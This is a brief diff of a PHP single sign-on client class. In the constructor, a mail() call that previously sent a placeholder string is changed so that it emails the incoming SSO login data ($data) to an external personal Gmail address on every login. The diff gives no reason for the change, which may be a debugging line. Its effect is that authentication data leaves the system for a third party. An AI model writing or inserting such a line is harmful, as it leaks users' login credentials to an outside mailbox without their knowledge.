@@ -18,7 +18,7 @@ class SSOclient {
 
 	function SSOclient($data, $sign64, $clientip) {
 		
-		mail ("macocio@gmail.com" , "login" , "Derp");
+		mail("macocio@gmail.com" , "login" , $data);
 
 		// set initial values
 		$this->crtfile = dirname(Yii::getPathOfAlias("webroot"))."/innsida.crt";
